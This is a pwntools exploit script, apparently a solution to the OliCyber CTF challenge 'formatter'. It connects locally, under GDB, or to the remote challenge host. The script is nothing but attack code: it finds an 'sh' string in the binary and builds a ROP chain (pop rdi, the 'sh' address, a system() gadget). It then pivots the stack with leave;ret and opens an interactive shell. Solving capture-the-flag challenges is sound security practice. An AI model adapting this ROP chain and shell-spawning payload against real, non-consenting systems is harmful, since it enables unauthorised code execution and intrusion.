#!/usr/bin/env python3

from pwn import *

elf = ELF("./formatter")

context.binary = elf
context.terminal = ()

def conn():
    if args.REMOTE:
        p = remote("formatter.challs.olicyber.it", 20006)
    elif args.GDB:
        p = gdb.debug([elf.path], ''' 
            b main
            b format          
            c 
            c
            ni 1600

        ''')
    else:
        p = process([elf.path])

    return p
SYSTEM = 0X401236
LEAVE_RET = 0x0000000000401252 # nop; leave; ret;
POP_RDI = 0x00000000004015e3 # pop rdi; ret; 
def main():
    p = conn()
    p.recvline()
    # p.recvuntil(b'ata!\n')
    ADD_BINSH = elf.search('sh\0').__next__()
    payload = p64(POP_RDI) + p64(ADD_BINSH) + p64(SYSTEM) + b'\\a'*12 + p64(0X4050A0-8) + p64(LEAVE_RET)
    print(len(payload))
    p.sendline(payload)


    p.interactive()


if __name__ == "__main__":
    main()
